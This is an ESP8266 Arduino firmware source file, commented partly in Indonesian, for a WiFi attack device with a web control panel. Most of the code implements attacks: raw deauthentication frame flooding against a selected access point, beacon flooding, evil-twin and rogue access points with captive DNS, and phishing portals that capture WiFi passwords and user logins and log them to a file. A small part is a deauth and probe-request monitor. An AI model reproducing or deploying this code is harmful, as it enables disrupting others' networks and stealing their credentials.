#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <SimpleCLI.h>
#include "LittleFS.h"

// --- DEKLARASI OBJEK GLOBAL (WAJIB DI SINI) ---
ESP8266WebServer webServer(80); 

// Baru panggil header lainnya agar tidak error "webServer not declared"
#include "sniffer.h"
#include "web.h"
#include "beacon.h"

#define MAC "C8:C9:A3:0C:5F:3F"
#define MAC2 "C8:C9:A3:6B:36:74"

bool lock = true;
SimpleCLI cli;
Command send_deauth;
Command stop_deauth;
Command reboot;
Command start_deauth_mon;
Command start_probe_mon;

int packet_deauth_counter = 0;

//////***********************File System******************/////
const char* fsName = "LittleFS";
LittleFSConfig fileSystemConfig = LittleFSConfig();
String fileList = "";
File fsUploadFile;              
File webportal;
File log_captive;
String status_button;

// Deklarasi fungsi agar tidak error 'not declared in this scope'
String getContentType(String filename); 
bool handleFileRead(String path);       
void handleFileUpload();                

String start_button = "Start";
int target_count = 0;
int target_mark = 0;

const uint8_t channels[] = {1, 6, 11}; 
const bool wpa2 = true; 
const bool appendSpaces = false; 

char ssids[500];
String wifistr = "";

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

int ledstatus = 0;
bool hotspot_active = false;
bool deauthing_active = false;
bool pishing_active = false;
bool hidden_target = false;
bool deauth_mon = false;
unsigned long d_mon_ = 0;
int ledState = LOW; 
int ledState2 = LOW; 
unsigned long previousMillis = 0;
const long interval = 1000;

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t rssi;
  uint8_t bssid[6];
  String bssid_str;
}  _Network;

const byte DNS_PORT = 53;
IPAddress apIP;
IPAddress dnsip;
DNSServer dnsServer;

_Network _networks[16];
_Network _selectedNetwork;
String ssid_target = "";
String mac_target = "";

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

void handleList(){
  fileList = "";
  // Perbaikan: gunakan LittleFS langsung jika fileSystem tidak didefinisikan di sniffer.h
  Dir dir = LittleFS.openDir("/"); 
  
  Serial.println(F("List of files at root of filesystem:"));
  while (dir.next()) {
    fileList += "<form style='text-align: left;margin-left: 5px;' action='/delete' method='post'><input type='submit' value='delete'><input name='filename' type='hidden' value='" + dir.fileName() +"'> ";
    fileList += dir.fileName();
    long size_ = dir.fileSize();
    fileList +=  String(" (") + size_/1000 + "kb)</form><br>";
    Serial.print("/");
    Serial.println(dir.fileName() + " " + dir.fileSize() + String(" bytes"));
  }
}

void handleFS(){
  handleList();
  FSInfo fs_info;
  LittleFS.info(fs_info);
  total_spiffs = fs_info.totalBytes/1000;
  used_spiffs = fs_info.usedBytes/1000;
  free_spiffs = total_spiffs - used_spiffs;
  
  static const char FS_html[] PROGMEM = R"=====(  <div class='card'><p class='card-title'>-File manager-</p><p Style='text-align: center';><form method='post' enctype='multipart/form-data'><input type='file' name='name'><input class='button' type='submit' value='Upload'></form><br>
                 <table><tr><th>Total :  {total_spiffs} kb</th></tr><br>
                 <tr><th>Used  :  {used_spiffs} kb</th></tr><br>
                 <tr><th>Free :  {free_spiffs} kb</th></tr></table><br>
                 <br></p>
                 <label style='text-align: left;margin-left: 5px;' for='list'>File List : <br> {fileList}</label></div>
                 <div class='card'><p class='card-title'>-Web-</p><p Style='text-align: center';> <form action='/websetting' method='POST'> <label for='path'><a href='/eviltwinprev' target='_blank'>Evil Twin</a></label><input type='text' name='evilpath' value='{eviltwinpath}'><br>
                      <label for='path'><a href='/pishingprev' target='_blank'>Pishing  </a></label><input type='text' name='pishingpath' value='{pishingpath}'><br>
                      <label for='path'><a href='/loadingprev' target='_blank'>Loading  </a></label><input type='text' name='loadingpath' value='{loadingpath}'>
                      <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>)=====";
  String fshtml = FPSTR(FS_html);
  fshtml.replace("{fileList}",fileList);
  fshtml.replace("{total_spiffs}", String(total_spiffs));
  fshtml.replace("{used_spiffs}",String(used_spiffs));
  fshtml.replace("{free_spiffs}",String(free_spiffs));
  fshtml.replace("{eviltwinpath}",String(eviltwinpath));
  fshtml.replace("{pishingpath}",String(pishingpath));
  fshtml.replace("{loadingpath}",String(loadingpath));
  webServer.send(200,"text/html",Header + fshtml + Footer);
}

void pishingprev(){
  webportal = LittleFS.open(pishingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void eviltwinprev(){
  webportal = LittleFS.open(eviltwinpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void loadingprev(){
  webportal = LittleFS.open(loadingpath,"r");
  webServer.streamFile(webportal,"text/html");
  webportal.close();
}

void handleFileUpload(){ 
  HTTPUpload& upload = webServer.upload();
  if(upload.status == UPLOAD_FILE_START){
    String filename = upload.filename;
    if(!filename.startsWith("/")) filename = "/"+filename;
    fsUploadFile = LittleFS.open(filename, "w");            
  } else if(upload.status == UPLOAD_FILE_WRITE){
    if(fsUploadFile) fsUploadFile.write(upload.buf, upload.currentSize); 
  } else if(upload.status == UPLOAD_FILE_END){
    if(fsUploadFile) {                                    
      fsUploadFile.close();                               
      handleFS();
    } else {
      webServer.send(500, "text/plain", "500: couldn't create file");
    }
  }
}

void handleDelete(){
  String names = String("/") + webServer.arg("filename");
  LittleFS.remove(names);
  handleFS();
}

void pathsave(){
  webServer.arg("evilpath").toCharArray(eviltwinpath,32);
  webServer.arg("pishingpath").toCharArray(pishingpath,32);
  webServer.arg("loadingpath").toCharArray(loadingpath,32);
  savesetting();
  handleFS();
}

void handleStartAttack(){
  int deauth = webServer.arg("deauth").toInt();
  int evil = webServer.arg("evil").toInt();
  int rogue = webServer.arg("rogue").toInt();
  int beacon = webServer.arg("beacon").toInt();
  int hidden = webServer.arg("hidden").toInt();
  
  if(start_button=="Start"){
    start_button = "Stop";
    if(beacon==1){
          beacon_active = true;
          enableBeacon(ssid_target);
    }
    if(deauth==1){
            deauthing_active = true;
    }
    if(evil==1||rogue==1){
      webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('WiFI restarting..');</script>");
      if(rogue==1){
        pishing_active = true;
        hotspot_active = true;
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(dnsip, dnsip, IPAddress(255, 255, 255, 0));
        WiFi.softAP(rogueap);
        dnsServer.start(53, "*", dnsip);
      }
      else{
        hotspot_active = true;
        char ssid[32];
        if(hidden==1){
          String(rogueap).toCharArray(ssid,32);
          hidden_target = true;
        } else {
          ssid_target.toCharArray(ssid,32);
        }
        WiFi.mode(WIFI_AP_STA);
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(dnsip, dnsip, IPAddress(255, 255, 255, 0));
        WiFi.softAP(ssid);
        dnsServer.start(53, "*", dnsip);
      }
    } else {
      handleIndex();
    }
  }
  else if(start_button=="Stop"){
    ledstatus = 35;
    start_button = "Start";
    pishing_active = false;
    hotspot_active = false;
    beacon_active = false;
    deauthing_active = false;
    handleIndex();
  }
}

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;

    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() {
  for (int i = 0; i < 6; i++){
     macAddr[i] = random(256);
  }
}

void enableBeacon(String target_ssid){
  wifistr = "";
  for(int i=0;i<beacon_size;i++){
    wifistr += target_ssid;
    for(int c=0;c<i;c++){
      wifistr += " ";
    }
    wifistr += "\n";
  }
  wifistr.toCharArray(ssids,500);
  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
  randomSeed(os_random());
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }
  randomMac();
  beacon_active = true;
}

void setup() {
  Serial.begin(115200);
  initFS();
  loadsetting();
  apIP.fromString(ip);
  dnsip.fromString(dns);
  wifi_set_channel(chnl);
  
  if(!WiFi.softAP(ssid, password, chnl, false)){
    wifi_set_opmode(STATIONAP_MODE);
    WiFi.softAP("WiFiX","12345678");
  }
  WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
  
  pinMode(2,OUTPUT);
  pinMode(16,OUTPUT);
  pinMode(4,OUTPUT);
  pinMode(0,INPUT_PULLUP);
  digitalWrite(2,HIGH);

  webServer.on("/",HTTP_GET, handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/style.css",handleStyle);
  webServer.on("/scan",HTTP_GET,handleScan);
  webServer.on("/start",HTTP_GET,handleStartAttack);
  webServer.on("/target",HTTP_POST,handleTarget);
  webServer.on("/delete",handleDelete);
  webServer.on("/websetting",HTTP_POST,pathsave);
  webServer.on("/setting",HTTP_GET,handleSetting);
  webServer.on("/networksetting",HTTP_POST,networksetting);
  webServer.on("/attacksetting",HTTP_POST,attacksetting);
  webServer.on("/eviltwinprev",HTTP_GET,eviltwinprev);
  webServer.on("/pishingprev",HTTP_GET,pishingprev);
  webServer.on("/loadingprev",HTTP_GET,loadingprev);
  webServer.on("/sniffer",HTTP_GET,handleSniffer);
  webServer.on("/log",HTTP_GET,handleLog);
  webServer.on("/deauthmon",HTTP_GET,Dstartmon);
  webServer.on("/probemon",HTTP_GET,Pstartmon);
  webServer.on("/filemanager",HTTP_GET,handleFS);
  
  webServer.on("/filemanager", HTTP_POST, [](){ webServer.send(200); }, handleFileUpload);
  webServer.on("/ssid_info",ssid_info);
  webServer.on("/index.js", HTTP_GET, handleJS);
  webServer.onNotFound(handleIndex);
  
  webServer.begin();

  send_deauth = cli.addCmd("send_deauth");
  stop_deauth = cli.addCmd("stop_deauth");
  reboot = cli.addCmd("reboot");
  start_deauth_mon = cli.addCmd("start_deauth_mon");
  handleList();
}

void handleJS(){
  sendProgmem(script, sizeof(script), "text/plain");
}

void handleLog(){
  log_captive = LittleFS.open("/log.txt","r");
  String loG = "<div class='card'><p class='card-title'>-Log-</p><p Style='text-align: center';>" +log_captive.readString()+"</p></div>";
  webServer.send(200,"text/html",Header + loG + Footer);
  log_captive.close();
}

void handleSetting(){
  static const char setting[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Network-</p><p Style='text-align: center';>
                        <form action='/networksetting' method='POST'> <label for='ssid'>SSID  </label><input type='text' name='ssid' value='{ssid}'><br>
                        <label for='pass'>Pass </label><input type='text' minlength='8' name='password' value='{password}'><br>
                        <label for='pass'>Chnl </label><input type='number' name='channel' value='{chnl}'><br>
                        <label for='ip'>IP DNS  </label><input type='text' name='dns' value='{dns}'></input><br>
                        <label for='ip'>Ip addr  </label><input type='text' name='ip' value='{ip}'></input><br>
                        <input style='width: 80px;height: 45px;' type ='submit' value ='Save'></form><br></p></div>
                        <div class='card'><p class='card-title'>-Attack-</p><p Style='text-align: center';>
                        <form action='/attacksetting' method='POST'> <label for='rogueap'>RogueAP</label><input type='text' name='rogueap' value='{rogueap}'><br>
                        <label for='enable_loading'>Loading page </label><input type='number' name='loading_enable' value='{loading_enable}'><br>
                        <label for='beacon_size'> Beacon size </label><input type='number' name='beacon_size' value='{beacon_size}'><br>
                        <label for='deauth_speed'> Deauth /s </label><input type='number' name='deauth_speed' value='{deauth_speed}'><br>
                        <input  style='width: 80px;height: 45px;'type ='submit' value ='Save'></form><br></p></div>)=====";
  String inputNetwork = FPSTR(setting);
  inputNetwork.replace("{ssid}",String(ssid));
  inputNetwork.replace("{password}",String(password));
  inputNetwork.replace("{chnl}",String(chnl));
  inputNetwork.replace("{dns}",String(dns));
  inputNetwork.replace("{ip}",String(ip));
  inputNetwork.replace("{rogueap}",String(rogueap));
  inputNetwork.replace("{loading_enable}",String(loading_enable));
  inputNetwork.replace("{beacon_size}",String(beacon_size));
  inputNetwork.replace("{deauth_speed}",String(deauth_speed));
  webServer.send(200,"text/html", Header + inputNetwork +  Footer);
}

void handleSniffer(){
  static const char sniferhtml[] PROGMEM = R"=====(<div class='card'><p class='card-title'>-Explanation-</p><p Style='text-align: center';>
                    What is this??<br>
                    this is a function for monitor mode,in this mode wifi will<br>
                    switches into station mode and starts sniffing packets around within its range<br>
                    - probe monitor, a function to track probe request packets<br>
                    and display some data such as hidden ssid, device mac address,<br>
                    RSSI, within range<br>
                    - deauth monitor, functions to track packets in deauther attacks such as<br> 
                    deauthentication or dissassociaten frame, which can display the distance<br>
                    of the attacker, the target mac and how many packets were sent<br>
                    D_mon is 'Deauth monitor' and P_mon is 'probe request monitor'
                    <br></p></div>
                    <div class='card'><p class='card-title'>-Start-</p><p Style='text-align: center';>
                    <a href='/deauthmon'><button class='button-on'>D_mon</button></a>&nbsp;
                    <a href='/probemon'><button class='button-on'>P_mon</button></a>
                    <br></p></div>)=====";
  webServer.send(200,"text/html",Header + sniferhtml + Footer);                
}

void Dstartmon(){
  deauth_mon = true;
  webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Starting deauth monitor');</script>");
  delay(3000);
  setup_d_detector();
}

void Pstartmon(){
  webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Starting probe request monitor');</script>");
  delay(3000);
  setupprobe();
}

void attacksetting(){
  webServer.arg("rogueap").toCharArray(rogueap,32);
  loading_enable = webServer.arg("loading_enable").toInt();
  beacon_size = webServer.arg("beacon_size").toInt();
  deauth_speed = webServer.arg("deauth_speed").toInt();
  savesetting();
  handleSetting();
}

void networksetting(){
  webServer.arg("ssid").toCharArray(ssid,32);
  webServer.arg("password").toCharArray(password,64);
  webServer.arg("dns").toCharArray(dns,32);
  webServer.arg("ip").toCharArray(ip,32);
  chnl = webServer.arg("channel").toInt();
  savesetting();
  handleSetting();
}

void ssid_info(){
  if(hidden_target==true) webServer.send(200,"text/plane",String(rogueap));
  else webServer.send(200,"text/plane",_selectedNetwork.ssid);
}

void performScan() {
  int n = WiFi.scanNetworks(false,true);
  target_count = n;
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.isHidden(i) ? "*HIDDEN*" : WiFi.SSID(i);
      network.bssid_str = WiFi.BSSIDstr(i);
      for (int j = 0; j < 6; j++) network.bssid[j] = WiFi.BSSID(i)[j];
      network.rssi = WiFi.RSSI(i);
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

void handleResult() {
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<script> setTimeout(function(){window.location.href = '/';}, 3000);  alert('Failed..,check the pasword again');</script>");
  } else {
    webServer.send(200, "text/html", "<html><body><h2>Update Berhasil...</h2></body></html>");
    webportal.close();
    ledstatus = 35;
    hotspot_active = false;
    deauthing_active = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    WiFi.softAPConfig(apIP, apIP , IPAddress(255, 255, 255, 0));
    WiFi.softAP(ssid, password);
    
    log_captive = LittleFS.open("/log.txt","a");
    log_captive.print("==> Attack: evil twin, target: "+ _selectedNetwork.ssid + ", pass: "+_tryPassword +"<br>");
    log_captive.close();
  }
}

void handleStyle(){
  webServer.send(200,"text/css", FPSTR(style));
}

void handleScan(){
  performScan();
  handleIndex();
}

void handleTarget(){
  ssid_target = webServer.arg("ssid");
  mac_target = webServer.arg("bssid");
  target_count = webServer.arg("mark").toInt();
  _selectedNetwork.ch = webServer.arg("ch").toInt();
  for (int i = 0; i < 16; i++) {
    if (bytesToStr(_networks[i].bssid, 6) == mac_target) _selectedNetwork = _networks[i];
  }
  handleIndex();
}

void handleIndex() {
  String deauth_s = deauthing_active ? "*" : "";
  String beacon_s = beacon_active ? "*" : "";
 
  static const char attack_html[] PROGMEM = R"=====( 
                   <div class='card'><p class='card-title'>-Setup-</p><p Style='text-align: center';>
                   <form style='text-align: left;margin-left: 5px;' method='post' action='/start' >
                   <input type='checkbox' value='1' name='deauth'><label for='deauth' >Deauth {deauth_s}</label><br>
                   <input type='checkbox' value='1' name='evil' ><label for='evil' >Evil twin</label><br>
                   <input type='checkbox' value='1' name='beacon' ><label for='beacon' >Beacon flood {beacon_s}</label><br>
                   <input type='checkbox' value='1' name='hidden' ><label for='hidden' >Target hidden</label><br>
                   <input type='checkbox' value='1' name='rogue' ><label for='rogue' >Rogue wifi</label><br><br>
                   <input style='width: 100px;height: 48px;' type='submit' value='{start_button}'></input></form>
                   <a href='/scan'><button class='button-on'>Scan</button></a>
                   </p></div>
                   <div class='card'><p class='card-title'>-Target-</p><p Style='text-align: center';>{scanned}</p></div>)=====";

  String _tempHTML = FPSTR(attack_html);
  _tempHTML.replace("{start_button}", start_button);
  _tempHTML.replace("{deauth_s}", deauth_s);
  _tempHTML.replace("{beacon_s}", beacon_s);

  if (hotspot_active == false) {
    String _html = "";
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      _html += "<form style='text-align: left;margin-left: 5px;' method='post' action='/target'>";
      _html += "<input name='ssid' type='hidden' value='" + _networks[i].ssid + "'>";
      _html += "<input name='ch' type='hidden' value='"+String(_networks[i].ch)+"'>";
      _html += "<input name='bssid' type='hidden' value='" + bytesToStr(_networks[i].bssid, 6) + "'>";
      _html += "<input name='mark' type='hidden' value='" + String(i) + "'>";
      
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<input type='submit' style='background-color: #90ee90;' value='selected'>";
      } else {
        _html += "<input type='submit' value='select'>";
      }
      _html += "<label> " + _networks[i].ssid + " (" + String(_networks[i].rssi) + ")</label></form><br>";
    }
    _tempHTML.replace("{scanned}", _html);
    webServer.send(200, "text/html", Header + _tempHTML + Footer);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(ssid_target.c_str(), _tryPassword.c_str());
      webServer.send(200,"text/html","<p>Verifying... please wait 15s</p><script>setTimeout(function(){window.location.href='/result';},15000);</script>");
      ledstatus = 40;
    } 
    else if (webServer.hasArg("user") && webServer.hasArg("pass")){
      log_captive = LittleFS.open("/log.txt","a");
      log_captive.print("==> Rogue: user: "+ webServer.arg("user") + " pass: " + webServer.arg("pass") + "<br>");
      log_captive.close();
      webServer.send(200,"text/html","Success");
      delay(3000);
      ESP.restart();
    }
    else {
      if(loading_enable==0){
        webportal = pishing_active ? LittleFS.open(pishingpath,"r") : LittleFS.open(eviltwinpath,"r");
      } else {
        webportal = LittleFS.open(loadingpath,"r");
      }
      webServer.streamFile(webportal,"text/html");
      webportal.close();
      ledstatus = 100;
    }
  }
}

void handleAdmin() { handleIndex(); }

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += "0";
    str += String(b[i], HEX);
    if (i < size - 1) str += ":";
  }
  return str;
}

unsigned long deauth_now = 0;
void loop() {
  if(digitalRead(0)==LOW){
    delay(2000);
    if(digitalRead(0)==LOW) { LittleFS.format(); ESP.restart(); }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (Serial.available()) {
    String input = Serial.readStringUntil('\n');
    cli.parse(input);
  }

  if (cli.available()) {
    Command cmd = cli.getCmd();
    if (cmd == send_deauth) deauthing_active = true;
    else if(cmd == stop_deauth) deauthing_active = false;
    else if(cmd == reboot) ESP.restart();
  }
 
  unsigned long currentMillis = millis();
  if (currentMillis - previousMillis >= 100) {
    previousMillis = currentMillis;
    ledState = !ledState;
    digitalWrite(16, ledState);
    if(ledstatus == 100) digitalWrite(2, ledState);
    else digitalWrite(2, (ledstatus == 35 ? LOW : LOW));
  }

  if (deauthing_active && millis() - deauth_now >= deauth_speed) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    for(int i=0;i<5;i++) wifi_send_pkt_freedom(deauthPacket, 26, 0);
    deauth_now = millis();
  }

  if (beacon_active && millis() - attackTime > 100) {
    attackTime = millis();
    nextChannel();
    // Logika beacon aslimu...
  }
}
